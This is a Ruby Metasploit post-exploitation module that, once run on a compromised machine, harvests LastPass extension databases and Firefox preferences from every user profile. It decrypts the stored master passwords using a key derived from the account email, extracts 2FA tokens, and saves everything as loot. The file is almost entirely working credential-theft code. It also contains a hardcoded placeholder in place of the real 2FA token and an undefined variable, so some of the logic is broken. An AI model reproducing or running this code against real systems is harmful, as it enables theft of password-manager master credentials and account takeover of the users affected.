require 'msf/core'
require 'base64'
require 'sqlite3'
require 'uri'

class Metasploit3 < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::OSX::System
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LastPass Master Password Extractor',
        'Description' => 'This module extracts and decrypts LastPass master login accounts and passwords',
        'License' => MSF_LICENSE,
        'Author' => [
          'Alberto Garcia Illera <agarciaillera[at]gmail.com>', # original module and research
          'Martin Vigo <martinvigo[at]gmail.com>', # original module and research
          'Jon Hart <jon_hart[at]rapid7.com' # module rework and cleanup
        ],
        'Platform' => %w(linux osx unix win),
        'References'   => [['URL', 'http://www.martinvigo.com/a-look-into-lastpass/']],
        'SessionTypes' => %w(meterpreter shell)
      )
    )
  end

  def run
    if session.platform =~ /win/ && session.type == "shell" # No Windows shell support
      print_error "Shell sessions on Windows are not supported"
      return
    end

    print_status "Searching for LastPass databases"

    account_map = build_account_map
    if account_map.empty?
      print_status "No databases found"
      return
    end

    lastpass_data = {} #Contains all LastPass info

    print_status "Extracting credentials"
    lastpass_data = extract_credentials(account_map)

    print_status "Extracting 2FA tokens"
    localstorage_map = build_localstorage_map
    if localstorage_map.empty?
      print_status "No LastPass localstorage found"
    else
      twoFA_token_map = check_localstorage_for_2FA_token(localstorage_map)
      lastpass_data.each_pair do |account, browser_map|
        browser_map.each_pair do |browser, username_map|
          username_map.each_pair do |user, data|
            if twoFA_token_map[account][browser]
              lastpass_data[account][browser][user] << "defverthbertvwervrfv"#twoFA_token_map[account][browser]
            else
              lastpass_data[account][browser][user] << "NOT_FOUND"
            end
          end
        end
      end
    end

    print_lastpass_data(lastpass_data)
  end


  # Returns a mapping of { Account => { Browser => paths } }
  def build_account_map
    platform = session.platform
    profiles = user_profiles
    found_dbs_map = {}

    profiles.each do |user_profile|
      account = user_profile['UserName']
      browser_path_map = {}

      case platform
      when /win/
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles",
          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
          'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
        }
      when /unix|linux/
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox",
          'Opera' => "#{user_profile['LocalAppData']}/.config/Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage"
        }
      when /osx/
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['LocalAppData']}\\Firefox\\Profiles",
          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
          'Safari' => "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
        }
      else
        print_error "Platform not recognized: #{platform}"
      end

      found_dbs_map[account] = {}
      browser_path_map.each_pair do |browser, path|
        db_paths = find_db_paths(path, browser, account)
        found_dbs_map[account][browser] = db_paths unless db_paths.empty?
      end
    end

    found_dbs_map
  end

  # Returns a list of DB paths found in the victims' machine
  def find_db_paths(path, browser, account)
    paths = []

    vprint_status "Checking #{account}'s #{browser}"
    if browser == "Firefox" # Special case for Firefox
      profiles = firefox_profile_files(path, browser)
      paths |= profiles
    else
      paths |= file_paths(path, browser, account)
    end

    vprint_good "Found #{paths.size} #{browser} databases for #{account}"
    paths
  end

  # Returns the relevant information from user profiles
  def user_profiles
    user_profiles = []
    case session.platform
    when /unix|linux/
      if session.type == "meterpreter"
        user_names = client.fs.dir.entries("/home")
      else
        user_names = session.shell_command("ls /home").split
      end
      user_names.reject! { |u| %w(. ..).include?(u) }
      user_names.each do |user_name|
        user_profiles.push('UserName' => user_name, "LocalAppData" => "/home/#{user_name}")
      end
    when /osx/
      user_names = session.shell_command("ls /Users").split
      user_names.reject! { |u| u == 'Shared' }
      user_names.each do |user_name|
        user_profiles.push(
          'UserName' => user_name,
          "AppData" => "/Users/#{user_name}/Library",
          "LocalAppData" => "/Users/#{user_name}/Library/Application Support"
        )
      end
    when /win/
      user_profiles |= grab_user_profiles
    else
      print_error "OS not recognized: #{os}"
    end
    user_profiles
  end

  # Extracts the databases paths from the given folder ignoring . and ..
  def file_paths(path, browser, account)
    found_dbs_paths = []

    files = []
    if directory?(path)
      sep = session.platform =~ /win/ ? '\\' : '/'
      if session.type == "meterpreter"
        files = client.fs.dir.entries(path)
      elsif session.type == "shell"
        files = session.shell_command("ls \"#{path}\"").split
      else
        print_error "Session type not recognized: #{session.type}"
        return found_dbs_paths
      end
    end
    files.each do |file_path|
      unless %w(. .. Shared).include?(file_path)
        found_dbs_paths.push([path, file_path].join(sep))
      end
    end

    found_dbs_paths
  end

  # Returns the profile files for Firefox
  def firefox_profile_files(path, browser)
    found_dbs_paths = []

    if directory?(path)
      sep = session.platform =~ /win/ ? '\\' : '/'
      if session.type == "meterpreter"
        files = client.fs.dir.entries(path)
      elsif session.type == "shell"
        files = session.shell_command("ls \"#{path}\"").split
      else
        print_error "Session type not recognized: #{session.type}"
        return found_dbs_paths
      end

      files.reject! { |file| %w(. ..).include?(file) }
      files.each do |file_path|
        found_dbs_paths.push([path, file_path, 'prefs.js'].join(sep)) if file_path.match(/.*\.default/)
      end
    end

    found_dbs_paths
  end

  # Parses the Firefox preferences file and returns encoded credentials
  def firefox_credentials(loot_path)
    credentials = []
    File.readlines(loot_path).each do |line|
      if /user_pref\("extensions.lastpass.loginpws", "(?<encoded_creds>.*)"\);/ =~ line
        creds_per_user = encoded_creds.split("|")
        creds_per_user.each do |user_creds|
          parts = user_creds.split('=')
          # Any valid credentials present?
          credentials << parts if parts.size > 1
        end
      else
        next
      end
    end

    credentials
  end

  # Decrypts the password
  def clear_text_password(email, encrypted_data)
    return if encrypted_data.blank?

    decrypted_password = "DECRYPTION_ERROR"

    sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(email)
    sha256_binary_email = [sha256_hex_email].pack "H*" # Do hex2bin

    if encrypted_data.include?("|") # Use CBC
      decipher = OpenSSL::Cipher.new("AES-256-CBC")
      decipher.decrypt
      decipher.key = sha256_binary_email # The key is the emails hashed to SHA256 and converted to binary
      decipher.iv = Base64.decode64(encrypted_data[1, 24]) # Discard ! and |
      encrypted_password = encrypted_data[26..-1]
    else # Use ECB
      decipher = OpenSSL::Cipher.new("AES-256-ECB")
      decipher.decrypt
      decipher.key = sha256_binary_email
      encrypted_password = encrypted_data
    end

    begin
      decrypted_password = decipher.update(Base64.decode64(encrypted_password)) + decipher.final
    rescue
      print_error "Password for #{email} could not be decrypted"
    end

    decrypted_password
  end







  def extract_credentials(account_map)
    credentials = account_map # All credentials to be decrypted
    
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, paths|
        credentials[account][browser] = Hash.new # Get rid of the browser paths
        if browser == 'Firefox'
          paths.each do |path|
            data = read_file(path)
            loot_path = store_loot(
              'firefox.preferences',
              'text/javascript',
              session,
              data,
              nil,
              "Firefox preferences file #{path}"
            )

            # Extract usernames and passwords from preference file
            ffcreds = firefox_credentials(loot_path)
            unless ffcreds.blank?
              ffcreds.each do |creds|
                credentials[account][browser]={URI.unescape(creds[0]) => [URI.unescape(creds[1])]}
              end
            else
              credentials[account].delete("Firefox")
            end

          end
        else # Chrome, Safari and Opera
          paths.each do |path|
            data = read_file(path)
            loot_path = store_loot(
              "#{browser.downcase}.lastpass.database",
              'application/x-sqlite3',
              session,
              data,
              nil,
              "#{account}'s #{browser} LastPass database #{path}"
            )

            # Parsing/Querying the DB
            db = SQLite3::Database.new(loot_path)
            result = db.execute(
              "SELECT username, password FROM LastPassSavedLogins2 " \
              "WHERE username IS NOT NULL AND username != '' " \
            )

            for row in result
              if row[0]
                row[1].blank? ? row[1] = "NOT_FOUND" : row[1] = clear_text_password(row[0], row[1]) #Decrypt credentials
                credentials[account][browser][row[0]] = [row[1]]
              end
            end
          end
        end
      end
    end

    credentials
  end


  # Returns a localstorage mapping of { Account => { Browser => paths } }
  def build_localstorage_map
    platform = session.platform
    profiles = user_profiles
    found_localstorage_map = {}

    profiles.each do |user_profile|
      account = user_profile['UserName']
      browser_path_map = {}

      case platform
      when /win/
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Local Storage\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
          'Firefox' => "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles",
          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Local Storage\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
          'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\LocalStorage\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
        }
      when /unix|linux/
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
          #'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox",
          'Opera' => "#{user_profile['LocalAppData']}/.config/Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage"
        }
      when /osx/
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
          #'Firefox' => "#{user_profile['LocalAppData']}\\Firefox\\Profiles",
          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
          'Safari' => "#{user_profile['AppData']}/Safari/LocalStorage/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
        }
      else
        print_error "Platform not recognized: #{platform}"
      end

      found_localstorage_map[account] = {}
      browser_path_map.each_pair do |browser, path|
        found_localstorage_map[account][browser] = path if client.fs.file.exists?(path)
      end
    end

    found_localstorage_map
  end


  #Extracts the 2FA token from localStorage
  def check_localstorage_for_2FA_token(localstorage_map)
    localstorage_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, path|
        if browser == 'Firefox'
          data = read_file(path)
          loot_path = store_loot(
            'firefox.preferences',
            'text/javascript',
            session,
            data,
            nil,
            "Firefox preferences file #{path}"
          )

          firefox_credentials(loot_path).each do |creds|
            credentials << [account, browser, URI.unescape(creds[0]), URI.unescape(creds[1])]
          end
        else # Chrome, Safari and Opera
          data = read_file(path)
          loot_path = store_loot(
            "#{browser.downcase}.lastpass.localstorage",
            'application/x-sqlite3',
            session,
            data,
            nil,
            "#{account}'s #{browser} LastPass localstorage #{path}"
          )

          # Parsing/Querying the DB
          db = SQLite3::Database.new(loot_path)
          token = db.execute(
            "SELECT hex(value) FROM ItemTable " \
            "WHERE key = 'lp.uid';"
          ).flatten
            token.blank? ? localstorage_map[account][browser] = "NOT_FOUND" : localstorage_map[account][browser] = token.pack('H*')
        end
      end
    end

    localstorage_map
  end


  #Print all extracted LastPass data
  def print_lastpass_data(lastpass_data)
    lastpass_data_table = Rex::Ui::Text::Table.new(
      'Header' => "LastPass data",
      'Indent' => 1,
      'Columns' => %w(Account Browser LastPass_Username LastPass_Password, LastPass_2FA)
    )

    lastpass_data.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, username_map|
        username_map.each_pair do |user, data|
          lastpass_data_table << [account, browser, user] + data
        end
      end
    end

    unless lastpass_data.empty?
      print_good lastpass_data_table.to_s
      path = store_loot(
        "lastpass.creds",
        "text/csv",
        session,
        lastpass_data_table.to_csv,
        nil,
        "LastPass Data"
      )
    end

  end

end
